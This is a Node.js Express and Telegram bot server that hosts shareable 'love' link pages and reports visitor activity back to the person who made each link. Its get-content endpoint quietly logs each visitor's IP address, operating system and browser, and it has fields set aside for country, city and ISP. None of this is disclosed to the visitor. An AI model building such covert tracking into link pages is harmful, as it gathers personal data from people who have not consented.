const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const path = require('path');
const https = require('https');
const fs = require('fs');

const { db, saveDB, AUTOMATIC_MUSIC_MAPPING, CATEGORY_CONFIGS, UPLOADS_DIR } = require('./modules/config');
const locale = require('./modules/locale');
const { parseUserAgent } = require('./modules/utils');
const { sendMainMenu } = require('./modules/handlers');

const app = express();
app.use(express.json());
app.set('trust proxy', true);
app.use('/uploads', express.static(UPLOADS_DIR));

const bot = new Telegraf(process.env.TELEGRAM_TOKEN);
const ADMIN_IDS = (process.env.ADMIN_CHAT_ID || "").split(',').map(id => id.trim()).filter(id => id !== "");
const SERVER_URL = "https://love-bb7p.onrender.com";

const isAdmin = (userId) => ADMIN_IDS.includes(userId.toString());

bot.use(async (ctx, next) => {
    const userId = ctx.chat?.id;
    if (!userId) return;
    if (!db.registeredUsers.includes(userId)) db.registeredUsers.push(userId);
    if (ctx.from?.username) db.usernameMap[ctx.from.username.toLowerCase()] = userId;
    saveDB();
    if (isAdmin(userId)) return next();
    if (db.bannedUsers.includes(userId)) return;
    if (db.isMaintenanceMode) {
        const session = db.userSessions[userId];
        if (session?.step === 'AWAITING_USER_FEEDBACK' || ctx.callbackQuery?.data === 'menu_feedback') return next();
        const maintKeyboard = Markup.inlineKeyboard([[Markup.button.callback(locale.btn_feedback, 'menu_feedback')]]);
        if (ctx.callbackQuery) { ctx.answerCbQuery().catch(() => {}); return ctx.editMessageText(locale.maint_msg, maintKeyboard).catch(() => {}); }
        return ctx.reply(locale.maint_msg, maintKeyboard).catch(() => {});
    }
    return next();
});

bot.command('start', (ctx) => { delete db.userSessions[ctx.chat.id]; saveDB(); sendMainMenu(ctx, false); });

// API Endpoints
app.post('/api/get-content', async (req, res) => {
    try {
        const linkId = req.body.id;
        const data = db.linkDatabase[linkId];
        if (!data) return res.json({ success: false });
        bot.telegram.sendMessage(data.userId, "কেউ আপনার লিংক ওপেন করেছে!").catch(() => {});
        
        let ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || "").split(',')[0].trim().replace('::ffff:', '');
        const { os, browser } = parseUserAgent(req.headers['user-agent'] || "");
        
        const visitorObj = { time: new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" }), ip, country: "Unknown", city: "Unknown", isp: "Unknown", os, browser };
        
        if (!data.visitors) data.visitors = [];
        data.visitors.push(visitorObj);
        saveDB();

        if (data.countdown && new Date(data.countdown) > new Date()) return res.json({ success: true, isLocked: true, countdownTime: data.countdown });
        const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
        return res.json({ success: true, isLocked: false, title: config.title, music: data.music, animations: data.animations, letter: data.letter, emojis: config.emojis, question: config.question, buttons: config.buttons, image: data.image || null });
    } catch (err) { res.json({ success: false }); }
});

app.post('/api/submit-answer', async (req, res) => {
    try {
        const { id, answer } = req.body;
        const data = db.linkDatabase[id];
        if (!data) return res.json({ success: false });
        data.answer = answer;
        saveDB();
        bot.telegram.sendMessage(data.userId, `আপনার তৈরি করা লিংক থেকে রিপ্লাই এসেছে।\nAns: ${answer}`).catch(() => {});
        return res.json({ success: true });
    } catch (err) { res.json({ success: false }); }
});

app.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    bot.launch().catch(err => console.error(err));
    console.log(`Server running on port ${PORT}`);
});
2
